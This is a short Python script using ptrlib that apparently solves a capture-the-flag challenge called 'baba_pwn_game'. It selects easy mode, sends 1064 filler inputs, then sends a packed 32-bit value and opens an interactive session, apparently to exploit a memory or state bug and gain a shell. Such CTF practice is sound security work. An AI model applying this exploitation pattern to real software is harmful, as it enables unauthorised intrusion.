from ptrlib import *

elf_path = './baba_pwn_game'
elf = ELF(elf_path)
io = process(elf_path)

io.sendlineafter('DIFFICULTY? (easy/hard)\n', 'easy')

for i in range(0, 1064):
    io.sendlineafter('> ', 'a')

io.sendlineafter('> ', p32(6))

io.interactive()


